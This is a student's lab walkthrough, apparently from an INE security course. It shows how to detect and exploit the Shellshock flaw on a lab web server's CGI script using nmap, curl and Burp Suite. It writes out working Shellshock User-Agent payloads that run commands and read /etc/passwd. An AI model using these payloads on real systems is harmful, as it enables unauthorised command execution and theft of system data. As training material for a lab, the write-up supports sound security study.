---
tags:
  - lab
  - red_team
  - T1109
  - T1059_004
  - web
  - Apache
  - nmap
  - BurpSuite
module: Assessment Methodologies
topic: Vulnerability Assessment
date: 2025-10-20
status: completed
---
# Objective

- Exploit the vulnerability and execute arbitrary commands on the target machine.

# Walkthrough

-  Ran `ifconfig` and `ping -c 1 demo.ine.local` commands to identify the network information of the attack machine and the victim machine. Confirmed:
	- The IP addresses of both the machines
	- The target machine is online and pingable
	- The machines are in the same subnet

  	  <img width="963" height="464" alt="4-2  Shellshock ifconfig" src="https://github.com/user-attachments/assets/3242441c-0a87-4c84-8817-54c90a8a24c4" />
  	  <img width="944" height="254" alt="4-2  Shellshock ping" src="https://github.com/user-attachments/assets/59444522-d5ff-4319-b327-bfe03ca476aa" />

- Conduct an initial service and port scan on port 80 and 443 of the target machine.

  <img width="1139" height="377" alt="4-2  Shellshock port and service" src="https://github.com/user-attachments/assets/b0c2be2c-eae0-4b67-a990-228b81a85564" />

- Find potential entry that allow use to exploit the shellshock vulnerability in the web page by checking the page source code with `curl` and `grep` commands

  <img width="1057" height="217" alt="4-2  Shellshock entry point" src="https://github.com/user-attachments/assets/34bbee0a-ff58-44b5-bf0b-985d91a40f30" />

- Find the NSE script related to shellshock vulnerability and learn it

  <img width="933" height="89" alt="4-2  Shellshock finding script" src="https://github.com/user-attachments/assets/3f572b9a-c2c0-4d0f-b86c-5c71cee3b9d4" />
  <img width="1067" height="659" alt="4-2  Shellshock script info" src="https://github.com/user-attachments/assets/cdc54fc8-4609-43a7-90a3-d1edbc8c4963" />

- Run the NSE script to test the vulnerability, `nmap -sV -p 80 --scirpt=http-shellshock --script=args uri=/gettime.cgi demo.ine.local`

  <img width="1159" height="746" alt="4-2  Shellshock nse" src="https://github.com/user-attachments/assets/341c021e-efcb-482b-9a14-eb90b4cb2179" />

- Or we can still use `curl` to verify the vulnerability, `time curl http://demo.ine.local/gettime_cgi` and `time curl -H "User-Agent: () { :;}; /bin/sleep 10" http://demo.ine.local/gettime_cgi`

  <img width="1343" height="415" alt="4-2  Shellshock curl time" src="https://github.com/user-attachments/assets/1e29bada-6d64-4df0-a067-54250d816225" />

  From the time values returned of the two command we can see the obvious difference. As in the second command I execute `/bin/sleep 10` bash command, there's significate difference in the two response time. So we are sure now that the URL is vulnerable.
- Configure the proxy and launch BurpSuite and enable intercept. Access the vulnerable directory, `/gettime.cgi`.

  <img width="1512" height="531" alt="4-2  Shellshock poxy" src="https://github.com/user-attachments/assets/11db80e5-0c12-428b-879b-f7462da98e9a" />

- Sent the request captured to Repeater. Modify the User-Agent field of the request to `() { ;: }; echo; echo; /bin/bash -c 'cat /etc/passwd'` and click send. Now we can see the code execution is successful and results returned can be found in Response.

  <img width="1206" height="722" alt="4-2  Shellshock exploit" src="https://github.com/user-attachments/assets/6f429447-b391-4656-9817-b2fcdb29374c" />

- Again, here we can also use `curl` to do exploit, `curl http://demo.ine.local/gettime.cgi -HÂ "User-Agent: () { :;}; echo; echo 'Content-Type: text/plain'; echo; /bin/cat /etc/passwd"`. 

  <img width="1480" height="682" alt="4-2  Shellshock curl exploit" src="https://github.com/user-attachments/assets/a531f4c8-067e-49d3-9c5c-095d1a2a8b9c" />

# Key Finds

We exploit the vulnerability in both two ways, a simple way with automatic scripts and tools, and a challenging way with basic tools only.
